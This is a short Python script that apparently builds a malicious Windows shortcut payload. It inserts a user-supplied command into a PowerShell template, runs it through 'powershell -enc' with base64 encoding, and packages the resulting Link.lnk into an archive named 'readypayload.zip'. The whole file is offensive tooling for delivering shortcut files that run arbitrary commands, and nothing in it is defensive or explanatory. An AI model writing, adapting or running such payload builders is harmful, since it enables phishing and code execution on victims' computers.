import sys
import base64
import shutil
import os

if len(sys.argv) < 2:
 print("<command>")
 sys.exit(0)
with open("shcut.ps1", "r") as file:
 data = file.read()
 data = data.replace('{COMMAND}', sys.argv[1])
 encscript = base64.b64encode(data.encode('utf-16-le')).decode()
 os.system("powershell -enc {}".format(encscript))
 shutil.make_archive("readypayload", "zip", "linkdir")
 os.remove("linkdir/Link.lnk")